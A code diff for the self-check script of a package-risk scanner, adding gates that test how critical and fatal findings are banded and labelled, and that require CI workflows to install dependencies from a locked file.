+    if level != CRITICAL_BAND_FLOOR:
+        problems.append(f"a lone CRITICAL read {level!r}, not {CRITICAL_BAND_FLOOR!r}")
+
+    # The floor raises; it must never lower an already-worse band.
+    many = [{"rule_id": f"R00{i}", "severity": "CRITICAL", "name": "x", "match": "y"}
+            for i in (1, 2, 3)]
+    _s, _b, high_level = calculate_score(many, {}, warm, config)
+    if high_level != "Critical":
+        problems.append(f"three CRITICALs read {high_level!r}, not 'Critical'")
+
+    # And it is CRITICAL-only: a HIGH keeps the band its weight earns.
+    high = [{"rule_id": "R004", "severity": "HIGH", "name": "x", "match": "y"}]
+    _s, _b, medium_level = calculate_score(high, {}, warm, config)
+    if medium_level != "Medium":
+        problems.append(f"a lone HIGH read {medium_level!r}, not 'Medium'")
+
+    return Gate("a critical finding never reads medium", not problems,
+                problems or CRITICAL_BAND_FLOOR)
+
+
+def gate_a_fatal_finding_names_itself() -> Gate:
+    """B4: a FATAL is structurally special, and the band alone cannot say so.
+
+    A FATAL caps the score at 100, so it arrives as ``Critical`` - and so
+    does a score that merely accumulated past 80. The two are different
+    claims: a FATAL rule is unsuppressible by construction and the shipped
+    ones target the *reviewer* rather than the machine.
+
+    The distinction rides ``risk_label`` rather than a new band, because
+    ``risk`` is a closed enum consumers gate on and nothing is lost without
+    it - the severity is in ``score_breakdown`` either way. This asserts the
+    label names the rule, that a plain Critical is unchanged, and that
+    naming it does not displace B2's coverage qualifier.
+    """
+    from trustsight.coverage import INCOMPLETE_SUFFIX
+    from trustsight.schema import PackageFact, ScoreEntry
+    from trustsight.scoring import verdict_label, verdict_level
+
+    def fact(**kw):
+        kw.setdefault("final_score", 100)
+        return PackageFact(package_name="demo", risk="Critical", **kw)
+
+    fatal = fact(score_breakdown=[ScoreEntry(rule_id="R013", severity="FATAL",
+                                             weight=0, reason="unicode")])
+    plain = fact(final_score=90)
+    gapped = fact(coverage_gaps=["diff_truncated"],
+                  score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL",
+                                              weight=0, reason="injection")])
+
+    problems = []
+    if verdict_level(fatal) != "Critical":
+        problems.append("the FATAL band left the closed enum")
+    if "FATAL: R013" not in verdict_label(fatal):
+        problems.append(f"the label does not name the rule: {verdict_label(fatal)!r}")
+    if verdict_label(plain) != "Critical":
+        problems.append(f"a plain Critical changed: {verdict_label(plain)!r}")
+    label = verdict_label(gapped)
+    if "FATAL: R012" not in label or not label.endswith(INCOMPLETE_SUFFIX):
+        problems.append(f"the gap qualifier was displaced: {label!r}")
+
+    return Gate("a fatal finding names itself in the label", not problems,
+                problems or verdict_label(fatal))
+
+
+def gate_ci_installs_from_the_lock() -> Gate:
+    """The gates only mean something if CI runs the code they check.
+
+    "CI is not compromised" is a stated assumption, and a live dependency
+    resolve is its softest edge: a workflow that pip-installs from PyPI on
+    every push lets a compromised release of any dependency run inside the
+    job that certifies the security model.
+
+    The flag has to be ``--locked``, not ``--frozen``.  Both install the
+    pinned, hashed versions in ``uv.lock`` and resolve nothing, but
+    ``--frozen`` performs *no check* that the lock still matches
+    ``pyproject.toml`` - a dependency added to the manifest and never locked
+    is silently ignored, and the job installs an older closure while
+    appearing to honour the manifest.  ``--locked`` fails instead, which is
+    the property that makes the lock meaningful rather than merely present.
+
+    Checked structurally over every workflow, because the failure mode is a
+    new workflow that installs the old way rather than an existing one
+    changing back.
+    """
+    problems: list[str] = []
+    installers: list[str] = []
+    workflows = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
+    if not workflows:
+        return Gate("CI installs from the lock", False, "no workflows found")
+    for path in workflows:
+        for lineno, line in enumerate(path.read_text().splitlines(), start=1):
+            stripped = line.strip()
+            if "pip install" in stripped:
+                problems.append(f"{path.name}:{lineno} pip install")
+            if "uv sync" in stripped or "uv export" in stripped:
+                installers.append(f"{path.name}:{lineno}")
+                if "--locked" not in stripped:
+                    problems.append(
+                        f"{path.name}:{lineno} reads the lock without --locked"
+                        + (" (--frozen skips the staleness check)"
+                           if "--frozen" in stripped else "")
+                    )
+    if not installers:
+        problems.append("no workflow installs dependencies from the lock")
+    if not (ROOT / "uv.lock").exists():
+        problems.append("uv.lock is missing")
+    return Gate("CI installs from the lock", not problems,
+                problems or installers)
+
+
 def gate_critical_paths_are_synchronised() -> Gate:
     """Keep CODEOWNERS, CI signature checks and contributor policy aligned."""
     from scripts.critical_paths import CRITICAL_PATHS
@@ -2050,7 +2923,9 @@ def run_gates() -> list[Gate]:
         gate_network_is_confined(),
         gate_single_network_host(),
         gate_network_reads_are_bounded(),
-        gate_no_archive_extraction(),
+        gate_no_path_based_archive_extraction(),
+        gate_every_stream_read_is_bounded(),
+        gate_artifact_reads_are_bounded(),
         gate_sql_is_parameterised(),
         gate_source_urls_are_never_fetched(),
         gate_every_json_report_carries_the_fingerprint(),
@@ -2062,6 +2937,8 @@ def run_gates() -> list[Gate]:
         gate_regex_input_is_bounded(),
         gate_expansion_is_bounded(),
         gate_regex_patterns_pass_adversarial_audit(),
+        gate_every_live_regex_is_audited(),
+        gate_untrusted_text_is_sanitised_where_it_is_rendered(),
         gate_tokenizer_smoke_is_deterministic(),
         gate_coverage_fails_closed(),
         gate_truncation_is_visible(),
@@ -2096,6 +2973,16 @@ def run_gates() -> list[Gate]:
         gate_flag_threshold_is_derived(),
         gate_doc_cross_references_resolve(),
     ]
+    gates.append(gate_generated_diff_is_bounded_before_assembly())
+    gates.append(gate_companion_reads_are_bounded_before_data())
+    gates.append(gate_a_critical_finding_never_reads_medium())
+    gates.append(gate_a_fatal_finding_names_itself())
+    gates.append(gate_unpinned_build_deps_is_a_declared_gap())
+    gates.append(gate_every_render_reports_the_same_information())
+    gates.append(gate_api_and_cli_emit_the_same_body())
+    gates.append(gate_score_is_withheld_by_default())
+    gates.append(gate_api_and_cli_share_the_analysis())
+    gates.append(gate_ci_installs_from_the_lock())
     gates.append(gate_critical_paths_are_synchronised())
     gates.append(gate_doc_lists_every_gate(gates))
     return gates
